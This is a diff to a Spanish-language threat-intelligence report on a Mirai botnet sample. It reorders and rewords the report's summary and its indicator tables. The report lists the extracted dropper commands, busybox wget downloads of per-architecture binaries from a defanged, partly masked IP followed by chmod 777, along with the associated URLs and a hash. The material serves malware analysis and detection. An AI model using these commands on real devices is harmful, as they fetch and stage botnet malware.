@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se asociaron 8 comandos observados o extraídos.
+Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificaron 8 comandos observados o extraídos. Se identificaron 17 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T19:35:06+00:00`
+- **Registrado:** `2026-08-09T19:35:06.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -45,7 +46,6 @@ Artefacto asociado a la familia **mirai** con evidencia suficiente para atribuci
 ## 🖥️ Comandos observados / extraídos
 
 ```text
-busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; .
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5;
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6;
@@ -53,23 +53,22 @@ busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k;
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips;
 busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl;
+busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4
 ```
 
 ## 🌐 Indicadores
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 31.77.227.XXX | static_analysis |
+| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
+| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
+| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
+| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
 | url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4 | strings |
 | url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; | strings |
 | url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; | strings |
 | url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; | strings |
-| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm7; | strings |
-| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; | strings |
-| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; | strings |
-| url | hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; | strings |
-| hash | 39b8fb94cd451a1724bce128c47ff21e9e81fe1f539cb8c76dbfc41bfba1def3 | static_analysis |
-| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4 | strings |
+| ip | 31.77.227.XXX | static_analysis |
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; . | strings |
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; | strings |
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; | strings |
@@ -77,6 +76,8 @@ busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; | strings |
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; | strings |
 | command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4jjfjf7sb2vdmv/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; | strings |
+| command | busybox wget hxxp://31.77.227.XXX/z0l1mxjm4mdl4 | strings |
+| hash | 39b8fb94cd451a1724bce128c47ff21e9e81fe1f539cb8c76dbfc41bfba1def3 | static_analysis |
 
 ## 🛡️ Nota de publicación
 
